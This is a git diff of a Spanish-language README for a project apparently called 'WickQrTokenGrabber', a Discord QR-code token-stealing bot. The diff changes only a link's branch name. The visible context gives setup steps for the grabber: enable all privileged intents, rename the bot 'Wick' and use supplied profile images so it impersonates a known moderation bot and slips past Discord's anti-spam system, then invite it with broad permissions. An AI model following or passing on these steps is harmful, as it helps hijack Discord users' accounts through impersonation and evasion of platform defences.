@@ -31,7 +31,7 @@
 - **Crear un nuevo Bot de Discord**
   - **Habilitar todos los intentos para el bot** Esto es muy importante. Si no habilita todos los intentos, el bot no funcionará.
     - https://discord.dev **Bot** > **Intentos de puerta de enlace privilegiados**
-  - **Para obtener los mejores resultados** Discord tiene un sistema antispam que deshabilitará cualquier bot sospechoso. Para evitar esto, es mejor utilizar los recursos proporcionados que se encuentran [aquí](https://github.com/k4itrun/WickQrTokenGrabber/tree/main/profile). Para que encaje con el perfil, cambie el nombre del bot a 'Wick' y configure la imagen de perfil como la proporcionada.
+  - **Para obtener los mejores resultados** Discord tiene un sistema antispam que deshabilitará cualquier bot sospechoso. Para evitar esto, es mejor utilizar los recursos proporcionados que se encuentran [aquí](https://github.com/k4itrun/WickQrTokenGrabber/tree/master/profile). Para que encaje con el perfil, cambie el nombre del bot a 'Wick' y configure la imagen de perfil como la proporcionada.
   - **Invita al bot a tu servidor** Usa el siguiente enlace para invitar a tu bot a tu servidor. Cambie `CLIENTID` a su ID de cliente de discord bots.
     - Para obtener la identificación del cliente para su bot > https://discord.dev **Oauth2** > **General**
     - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
